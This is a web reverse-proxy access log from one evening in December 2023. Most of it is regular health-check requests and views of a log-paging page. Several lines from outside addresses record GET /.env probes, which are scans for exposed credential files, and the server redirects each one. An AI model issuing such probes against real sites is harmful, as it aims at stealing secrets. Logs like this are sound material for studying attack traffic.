167.71.120.76 - - [20/Dec/2023:16:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2232 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2233 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2234 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2235 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2236 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2237 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2238 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2239 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2240 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2241 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2242 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2243 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2244 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2245 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2246 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2247 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2248 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2249 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2250 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2251 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2252 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2253 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2254 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2255 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2256 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2257 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2258 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2259 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2260 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2261 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2262 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2263 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2264 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2265 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2266 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2267 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2268 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2269 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2270 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2271 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2272 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [20/Dec/2023:17:07:01 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2273 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:17:07:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2274 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:17:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2275 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2276 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2277 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2278 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2279 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2280 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2281 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2282 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2283 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2284 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2285 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2286 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2287 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2288 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2289 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2290 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2291 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:17:15:22 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 2292 "logpager@docker" "http://172.20.0.3:80" 2ms
129.55.200.20 - - [20/Dec/2023:17:15:22 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1969 "-" "-" 2293 "logpager@docker" "http://172.20.0.3:80" 4ms
129.55.200.20 - - [20/Dec/2023:17:15:24 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1991 "-" "-" 2294 "logpager@docker" "http://172.20.0.3:80" 3ms
129.55.200.20 - - [20/Dec/2023:17:15:27 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1948 "-" "-" 2295 "logpager@docker" "http://172.20.0.3:80" 6ms
129.55.200.20 - - [20/Dec/2023:17:15:28 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 1945 "-" "-" 2296 "logpager@docker" "http://172.20.0.3:80" 9ms
129.55.200.20 - - [20/Dec/2023:17:15:30 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1945 "-" "-" 2297 "logpager@docker" "http://172.20.0.3:80" 12ms
129.55.200.20 - - [20/Dec/2023:17:15:31 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1969 "-" "-" 2298 "logpager@docker" "http://172.20.0.3:80" 17ms
129.55.200.20 - - [20/Dec/2023:17:15:32 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 1952 "-" "-" 2299 "logpager@docker" "http://172.20.0.3:80" 18ms
167.71.120.76 - - [20/Dec/2023:17:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2300 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2301 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2302 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2303 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2304 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2305 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2306 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2307 "www@docker" "http://172.20.0.9:80" 0ms
54.36.115.221 - - [20/Dec/2023:17:19:25 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2308 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:17:19:26 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2309 "web-to-websecure@internal" "-" 0ms
129.55.200.20 - - [20/Dec/2023:17:19:31 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 1956 "-" "-" 2310 "logpager@docker" "http://172.20.0.3:80" 28ms
129.55.200.20 - - [20/Dec/2023:17:19:33 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 1998 "-" "-" 2311 "logpager@docker" "http://172.20.0.3:80" 28ms
167.71.120.76 - - [20/Dec/2023:17:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2312 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:17:19:34 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 1945 "-" "-" 2313 "logpager@docker" "http://172.20.0.3:80" 33ms
129.55.200.20 - - [20/Dec/2023:17:19:35 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 1946 "-" "-" 2314 "logpager@docker" "http://172.20.0.3:80" 37ms
129.55.200.20 - - [20/Dec/2023:17:19:36 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 1954 "-" "-" 2315 "logpager@docker" "http://172.20.0.3:80" 43ms
129.55.200.20 - - [20/Dec/2023:17:19:37 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 1993 "-" "-" 2316 "logpager@docker" "http://172.20.0.3:80" 52ms
129.55.200.20 - - [20/Dec/2023:17:19:38 +0000] "GET /logs/logtail.php?page=12 HTTP/2.0" 200 1945 "-" "-" 2317 "logpager@docker" "http://172.20.0.3:80" 55ms
129.55.200.20 - - [20/Dec/2023:17:19:39 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2109 "-" "-" 2318 "logpager@docker" "http://172.20.0.3:80" 4ms
57.129.23.166 - - [20/Dec/2023:17:20:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2319 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:17:20:10 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2320 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:17:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2321 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2322 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2323 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2324 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2325 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2326 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:17:22:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2327 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:17:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2328 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2329 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2330 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2331 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2332 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2333 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2334 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2335 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:17:27:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2336 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:17:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2337 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2338 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2339 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2340 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2341 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2342 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2343 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2344 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2345 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2346 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2347 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2348 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2349 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2350 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2351 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2352 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2353 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2354 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2355 "www@docker" "http://172.20.0.9:80" 1ms
167.94.146.52 - - [20/Dec/2023:17:36:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2356 "web-to-websecure@internal" "-" 0ms
167.94.146.52 - - [20/Dec/2023:17:36:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2357 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:17:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2358 "www@docker" "http://172.20.0.9:80" 0ms
167.94.146.52 - - [20/Dec/2023:17:36:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2359 "-" "-" 0ms
45.33.87.154 - - [20/Dec/2023:17:36:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2360 "-" "-" 0ms
45.79.172.21 - - [20/Dec/2023:17:37:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2361 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:17:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2362 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2363 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2364 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2365 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2366 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2367 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2368 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2369 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2370 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2371 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2372 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2373 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2374 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2375 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2376 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2377 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2378 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2379 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2380 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2381 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2382 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2383 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2384 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2385 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2386 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2387 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2388 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2389 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2390 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:17:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2391 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2392 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2393 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2394 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2395 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2396 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2397 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2398 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2399 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2400 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2401 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2402 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2403 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:17:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2404 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2405 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:17:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2406 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:17:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2407 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:18:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2408 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:18:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2409 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:18:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2410 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:18:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2411 "www@docker" "http://172.20.0.9:80" 0ms
